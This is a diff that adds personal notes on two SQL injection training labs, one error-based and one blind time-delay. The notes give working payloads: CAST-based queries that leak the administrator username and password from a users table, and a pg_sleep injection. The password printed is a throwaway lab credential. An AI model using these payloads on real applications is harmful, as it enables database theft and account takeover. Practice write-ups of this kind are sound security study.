@@ -399,6 +399,85 @@
 ---
 
 
+<img width="563" height="439" alt="image" src="https://github.com/user-attachments/assets/b48c31e1-cbbf-44ce-b9f3-735e97277ace" />
+
+
+
+//LAB: Visible error-based SQLi
+
+
+
+
+- `'` got us 500 error
+
+<img width="1241" height="464" alt="image" src="https://github.com/user-attachments/assets/3161476b-656c-45e8-aa57-f0f5dca0e479" />
+
+
+- `-- -` fixed it to give us 200OK -- so we now have a valid query again
+- we then tried adding `' and CAST((select 1)as int)-- -` -- using int here to extract error since the query asks for char
+- now we get a new error saying `AND` condition must be boolean
+- so we adjusted our payload by adding `1=` -- to be `' and 1=CAST((select 1)as int)-- -`
+- then we no longer get the error -- so we got a valid query again
+- now try and leak username with `'and 1=CAST((select username from users)as int)-- -` -- and found that new error got truncated
+- so then we have to delete something -- and we got rid of the trackingId cookie value to get some space
+- resend the request and we got a new error - caused by the response returning more than one row
+- so we adjust the payload to `' and 1=CAST((select username from users limit 1)as int)-- -` -- to get the db to return only one row
+- this new error leaks `administrator` user -- implying administrator is the first user in the users table
+- finally we got leaked admin's password with `' and 1=CAST((select password from users limit 1)as int)-- -`
+- `sgvtiguz7jey49p5flnh`
+
+<img width="1244" height="485" alt="image" src="https://github.com/user-attachments/assets/f3f310f0-2b0b-42ff-bfa7-17fae5757bbf" />
+
+
+- log in with `administrator : sgvtiguz7jey49p5flnh`
+- and lab solved
+
+<img width="917" height="424" alt="image" src="https://github.com/user-attachments/assets/fcea0119-c51a-4a14-a1e1-858c54415b0a" />
+
+
+---
+
+
+
+<img width="658" height="604" alt="image" src="https://github.com/user-attachments/assets/06f1070a-16c7-4491-9c3d-070627e8eb7e" />
+
+
+//LAB: Blind SQLi with time delays
+
+
+
+
+- try different time-based payloads
+
+<img width="1247" height="339" alt="image" src="https://github.com/user-attachments/assets/5621f451-313b-4a39-8d7d-a547bfd9b0a1" />
+
+<img width="1237" height="324" alt="image" src="https://github.com/user-attachments/assets/e470eff4-9c64-4a58-a36a-63dcc6d47477" />
+
+
+- note that simple `'` would NOT return error pages -- only time-based payloads can infer successful injections via time delays
+- eventually this works `'+||+pg_sleep(10)--+-`
+
+
+<img width="1242" height="327" alt="image" src="https://github.com/user-attachments/assets/00789e94-e87d-4540-83c4-a724408de820" />
+
+
+
+- and lab solved
+
+
+<img width="921" height="376" alt="image" src="https://github.com/user-attachments/assets/4e9b4547-dabb-46e3-9c26-454e4a1433c6" />
+
+
+---
+
+
+
+
+
+
+
+
+
 
 
 
